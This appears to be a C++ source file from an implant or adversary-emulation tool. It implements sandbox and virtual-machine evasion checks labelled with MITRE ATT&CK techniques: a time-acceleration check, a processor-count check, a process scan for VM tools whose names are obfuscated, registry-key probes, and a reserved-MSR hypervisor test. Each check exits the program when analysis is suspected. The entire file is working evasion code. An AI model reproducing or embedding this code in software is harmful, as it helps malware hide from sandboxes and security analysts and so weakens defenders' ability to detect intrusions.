#include "AVM.h"

//  CheckExpectedTime(std::chrono::duration<double> duration, std::chrono::duration<double> lastDuration, int sleep_time)
//      About:
//         Takes the current runtime "duration", the last saved duration value "lastduration", and the sleep_time since the last time the function was ran
//			Sleep time used to adjust the value and the last duration should be greater than .0001, otherwise the application may be expeciencing acceleration via
//			a sandbox.
//      Result:
//          Returns true if the time checks out, otherwise the application exits
//      MITRE ATT&CK Techniques:
//          T1497.003 Time Based Evasion
BOOL CheckExpectedTime(std::chrono::duration<double> duration, std::chrono::duration<double> lastDuration, int sleep_time) {
	std::chrono::duration<double> sleep = (std::chrono::duration<double>)sleep_time / 1000;
	std::chrono::duration<double> delta = duration - lastDuration - sleep;
	// If the delta is less than .0001 then its possible the sandbox is speeding up time.
	if (delta < std::chrono::duration<double>(.0001)) {
		if (DEBUG_MSG)
			writeToFile(XorStr("Time delta error"),"error");
		exit(CHECK_TIME_ERROR);
	}
	return true;
}

//  CheckProcCount()
//      About:
//         Checks the number of processors on the implant system
//      Result:
//          if the processors are equal to 1 the application closes
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1497.001 System Checks
std::string CheckProcCount() {
	try {
		SYSTEM_INFO stInfo = GetSysInfo();
		if (DEBUG_MSG)
			writeToFile(XorStr("Processor Count: ") + stInfo.dwNumberOfProcessors);
		if (stInfo.dwNumberOfProcessors == 1) {
			if (DEBUG_MSG)
				writeToFile(XorStr("Single Processor"),"error");
			exit(CORE_CHECK_ERROR);
		}
		return XorStr("Check Process Count function - Success!\n");
	}
	catch (...) {
		return XorStr("Check Process Count function - Failed!\n");
	}

}

//  CheckVMProcess()
//      About:
//         Get the running process list and checks for any vm tooling that may be running
//      Result:
//          if any vm tooling is matched the application closes
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1497.001 System Checks
std::string CheckVMProcess() {
	try {

		HANDLE hSnapshot;
		PROCESSENTRY32 pe;

		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnapshot == INVALID_HANDLE_VALUE) {
			if(DEBUG_MSG)
				writeToFile(std::to_string(GetLastError()));
		}
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hSnapshot, &pe)) {
			CloseHandle(hSnapshot);
			if (DEBUG_MSG)
				writeToFile(std::to_string(GetLastError()));
		}

		char vtd[] = "GBtZFDBe.GTm";
		// vmtoolsd.exe
		*vtd = 118;
		*(vtd + 1) = RetCharVal(27, 87);
		*(vtd + 3) = RetCharVal(105, 11);
		*(vtd + 4) = RetCharVal(94, 22);
		*(vtd + 5) = RetCharVal(27, 86);
		*(vtd + 6) = 115;
		*(vtd + 7) = RetCharVal(44, 61);
		*(vtd + 9) = RetCharVal(59, 47);
		*(vtd + 10) = RetCharVal(113, 12);
		*(vtd + 11) = RetCharVal(47, 59);

		char vbo[] = "sJcxRyrC";
		//vbox.exe
		*vbo = RetCharVal(14, 109);
		*(vbo + 1) = RetCharVal(63, 40);
		*(vbo + 2) = RetCharVal(86, 30);
		*(vbo + 4) = 46;
		*(vbo + 5) = RetCharVal(77, 29);
		*(vbo + 6) = 120;
		*(vbo + 7) = RetCharVal(67, 39);


		do {
			if (std::string{ pe.szExeFile } == std::string{ vtd } || std::string{pe.szExeFile} == std::string{vbo}) {
				if (DEBUG_MSG)
					writeToFile(XorStr("Found VM Process"),"error");
				exit(1);
			}
		} while (Process32Next(hSnapshot, &pe));

		CloseHandle(hSnapshot);
		return XorStr("Check VM Process function - Success!\n");
	}
	catch (...) {
		return XorStr("Check VM Process function - Failed!\n");
	}
}

//  RegistryCheck(HKEY hkey, LPCSTR path )
//      About:
//          Takes 2 arguments, the base register and the registry key path
//      Result:
//          If the key does exist on the system the application closes
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1082 System Information Discovery
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
std::string RegistryCheck(HKEY hkey, LPCSTR path) {
	try {
		HKEY subKey = nullptr;

		LONG lResult = RegOpenKeyEx(hkey, TEXT(path), 0, KEY_READ, &subKey);
		if (ERROR_SUCCESS == lResult) {
			if (DEBUG_MSG)
				writeToFile(XorStr("Found VM registry keys. Exiting!"),"error");
			exit(REG_CHECK_ERROR);
		}
		return XorStr("Registry check function - Success!\n");
	}
	catch (...) {
		return XorStr("Registry check function - Failed!\n");
	}

}

//  MSRCheck() 
//      About:
//			Reads an MSR (Model-Specific Register) range that is "reserved". This "reserved" range is sometimes used by hypervisors. If an exception isnt thrown then the 
//			application exits because it is likely a hypervisor.
//      Result:
//          returns to execution if an exception is thrown, otherwise the application exits.
//      MITRE ATT&CK Techniques:
//          T1497.001 System Checks
//		Resource:
//			https://secret.club/2020/04/13/how-anti-cheats-detect-system-emulation.html#synthetic-msrs
//			https://howtohypervise.blogspot.com/2018/09/detecting-vmware-by-reading-invalid-msr.html
VOID MSRCheck() {
	__try
	{
		__readmsr(HV_MSR_RANGE_START);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return;
		// No synthetic MSR detected
	}
	
	exit(MSR_CHECK_ERROR);
	}